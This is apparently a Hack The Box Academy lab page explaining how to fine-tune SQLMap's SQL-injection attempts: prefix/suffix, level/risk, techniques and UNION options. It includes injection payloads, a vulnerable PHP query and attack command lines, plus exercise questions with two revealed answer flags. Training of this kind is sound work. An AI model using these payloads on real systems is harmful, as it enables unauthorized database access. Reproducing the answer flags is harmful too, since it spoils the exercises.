
<h1>Attack Tuning</h1>
<hr/>
<p>In most cases, SQLMap should run out of the box with the provided target details. Nevertheless, there are options to fine-tune the SQLi injection attempts to help SQLMap in the detection phase. Every payload sent to the target consists of:</p>
<ul>
<li>
<p>vector (e.g., <code>UNION ALL SELECT 1,2,VERSION()</code>): central part of the payload, carrying the useful SQL code to be executed at the target.</p>
</li>
<li>
<p>boundaries (e.g. <code>'&lt;vector&gt;-- -</code>): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.</p>
</li>
</ul>
<hr/>
<h2>Prefix/Suffix</h2>
<p>There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.<br/>
For such runs, options <code>--prefix</code> and <code>--suffix</code> can be used as follows:</p>
<pre><code class="language-bash">sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
</code></pre>
<p>This will result in an enclosure of all vector values between the static prefix <code>%'))</code> and the suffix <code>-- -</code>.<br/>
For example, if the vulnerable code at the target is:</p>
<pre><code class="language-php">$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
</code></pre>
<p>The vector <code>UNION ALL SELECT 1,2,VERSION()</code>, bounded with the prefix <code>%'))</code> and the suffix <code>-- -</code>, will result in the following (valid) SQL statement at the target:</p>
<pre><code class="language-sql">SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
</code></pre>
<hr/>
<h2>Level/Risk</h2>
<p>By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.</p>
<p>For such demands, the options <code>--level</code> and <code>--risk</code> should be used:</p>
<ul>
<li>
<p>The option <code>--level</code> (<code>1-5</code>, default <code>1</code>) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).</p>
</li>
<li>
<p>The option <code>--risk</code> (<code>1-3</code>, default <code>1</code>) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).</p>
</li>
</ul>
<p>The best way to check for differences between used boundaries and payloads for different values of <code>--level</code> and <code>--risk</code>, is the usage of <code>-v</code> option to set the verbosity level. In verbosity 3 or higher (e.g. <code>-v 3</code>), messages containing the used <code>[PAYLOAD]</code> will be displayed, as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5

...SNIP...
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
...SNIP...
[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
...SNIP...
[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
...SNIP...
[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
</code></pre>
<p>On the other hand, payloads used with the default <code>--level</code> value have a considerably smaller set of boundaries:</p>
<pre><code class="language-shell-session">[!bash!]$ sqlmap -u www.example.com/?id=1 -v 3
...SNIP...
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
[14:20:36] [PAYLOAD] 1 AND 7496=4313
[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
</code></pre>
<p>As for vectors, we can compare used payloads as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ sqlmap -u www.example.com/?id=1
...SNIP...
[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
...SNIP...
</code></pre>
<pre><code class="language-shell-session">[!bash!]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3

...SNIP...
[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
...SNIP...
[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
...SNIP...
[14:46:05] [INFO] testing 'MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[14:46:05] [INFO] testing 'MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
...SNIP...
[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[14:46:06] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:46:06] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
...SNIP...
</code></pre>
<p>As for the number of payloads, by default (i.e. <code>--level=1 --risk=1</code>), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (<code>--level=5 --risk=3</code>) the number of payloads increases to 7,865.</p>
<p>As SQLMap is already tuned to check for the most common boundaries and vectors, regular users are advised not to touch these options because it will make the whole detection process considerably slower. Nevertheless, in special cases of SQLi vulnerabilities, where usage of <code>OR</code> payloads is a must (e.g., in case of <code>login</code> pages), we may have to raise the risk level ourselves.</p>
<p>This is because <code>OR</code> payloads are inherently dangerous in a default run, where underlying vulnerable SQL statements (although less commonly) are actively modifying the database content (e.g. <code>DELETE</code> or <code>UPDATE</code>).</p>
<hr/>
<h2>Advanced Tuning</h2>
<p>To further fine-tune the detection mechanism, there is a hefty set of switches and options. In regular cases, SQLMap will not require its usage. Still, we need to be familiar with them so that we could use them when needed.</p>
<h4>Status Codes</h4>
<p>For example, when dealing with a huge target response with a lot of dynamic content, subtle differences between <code>TRUE</code> and <code>FALSE</code> responses could be used for detection purposes. If the difference between <code>TRUE</code> and <code>FALSE</code> responses can be seen in the HTTP codes (e.g. <code>200</code> for <code>TRUE</code> and <code>500</code> for <code>FALSE</code>), the option <code>--code</code> could be used to fixate the detection of <code>TRUE</code> responses to a specific HTTP code (e.g. <code>--code=200</code>).</p>
<h4>Titles</h4>
<p>If the difference between responses can be seen by inspecting the HTTP page titles, the switch <code>--titles</code> could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag <code>&lt;title&gt;</code>.</p>
<h4>Strings</h4>
<p>In case of a specific string value appearing in <code>TRUE</code> responses (e.g. <code>success</code>), while absent in <code>FALSE</code> responses, the option <code>--string</code> could be used to fixate the detection based only on the appearance of that single value (e.g. <code>--string=success</code>).</p>
<h4>Text-only</h4>
<p>When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. <code>&lt;script&gt;</code>, <code>&lt;style&gt;</code>, <code>&lt;meta&gt;</code>, etc.), we can use the <code>--text-only</code> switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.</p>
<h4>Techniques</h4>
<p>In some special cases, we have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the option <code>--technique</code> can specify the SQLi technique to be used.</p>
<p>For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with <code>--technique=BEU</code>.</p>
<h4>UNION SQLi Tuning</h4>
<p>In some cases, <code>UNION</code> SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option <code>--union-cols</code> (e.g. <code>--union-cols=17</code>). In case that the default "dummy" filling values used by SQLMap -<code>NULL</code> and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g. <code>--union-char='a'</code>).</p>
<p>Furthermore, in case there is a requirement to use an appendix at the end of a <code>UNION</code> query in the form of the <code>FROM &lt;table&gt;</code> (e.g., in case of Oracle), we can set it with the option <code>--union-from</code> (e.g. <code>--union-from=users</code>).<br/>
Failing to use the proper <code>FROM</code> appendix automatically could be due to the inability to detect the DBMS name before its usage.</p>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                    </span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
</div>
</div>
<div>
<div>
<label class="module-question" for="294"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> What's the contents of table flag5? (Case #5)
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control text-success" disabled="true" type="text" value="HTB{700_much_r15k_bu7_w0r7h_17}"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="294" disabled="true" id="btnAnswer294">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="mb-4 mr-1">
<button class="btn btn-outline-warning btn-block" data-target="#hint294" data-toggle="modal" id="hintBtn294"><i class="fad fa-life-ring mr-2"></i> Hint
                                        </button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<label class="module-question" for="295"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> What's the contents of table flag6? (Case #6)
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control text-success" disabled="true" type="text" value="HTB{v1nc3_mcm4h0n_15_4570n15h3d}"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="295" disabled="true" id="btnAnswer295">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="mb-4 mr-1">
<button class="btn btn-outline-warning btn-block" data-target="#hint295" data-toggle="modal" id="hintBtn295"><i class="fad fa-life-ring mr-2"></i> Hint
                                        </button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<label class="module-question" for="296"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> What's the contents of table flag7? (Case #7)
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer296" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-296">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="296" id="btnAnswer296">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="mb-4 mr-1">
<button class="btn btn-outline-warning btn-block" data-target="#hint296" data-toggle="modal" id="hintBtn296"><i class="fad fa-life-ring mr-2"></i> Hint
                                        </button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
